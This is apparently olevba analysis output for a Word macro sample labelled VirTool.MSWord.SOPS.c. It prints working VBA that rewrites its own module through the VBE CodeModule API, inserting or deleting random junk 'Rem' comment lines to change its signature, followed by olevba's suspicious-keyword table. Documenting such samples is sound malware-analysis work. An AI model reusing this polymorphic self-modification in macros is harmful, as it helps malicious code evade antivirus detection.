olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: VirTool.MSWord.SOPS.c-a77e2c4182a4e8d43f7b0574114a0e98e7d69f49
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: VirTool.MSWord.SOPS.c-a77e2c4182a4e8d43f7b0574114a0e98e7d69f49 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO SOPS.bas 
in file: VirTool.MSWord.SOPS.c-a77e2c4182a4e8d43f7b0574114a0e98e7d69f49 - OLE stream: 'Macros/VBA/SOPS'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub SomeOtherPolymorphicSystem()
On Error Resume Next

Randomize

ActiveLines = Application.VBE.ActiveVBProject.VBComponents("SOPS").CodeModule.CountOfLines

If ActiveLines > 65 Then
    
    With Application.VBE.ActiveVBProject.VBComponents("SOPS").CodeModule
    
        For TheLine = 1 To .CountOfLines
            If Left(.Lines(TheLine, 1), 3) = "Rem" Then .DeleteLines TheLine
        Next TheLine
    
    End With
    
Else
    
    With Application.VBE.ActiveVBProject.VBComponents("SOPS").CodeModule
    
        PolySize = Int(Rnd * 10)
    
        For PolyMorphic = 1 To PolySize
            
            PolyString = ""
            PolyLines = .CountOfLines
            
            RndLine = Int(Rnd * PolyLines) + 1
            StringSize = Int(Rnd * 39) + 1
            
                For SomeString = 1 To StringSize
                    PolyString = PolyString & Chr(65 + Int(Rnd * 22)) & Chr(122 - Int(Rnd * 22))
                Next SomeString
            
            .InsertLines RndLine, "Rem " & PolyString
        
        Next PolyMorphic

    End With

End If

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

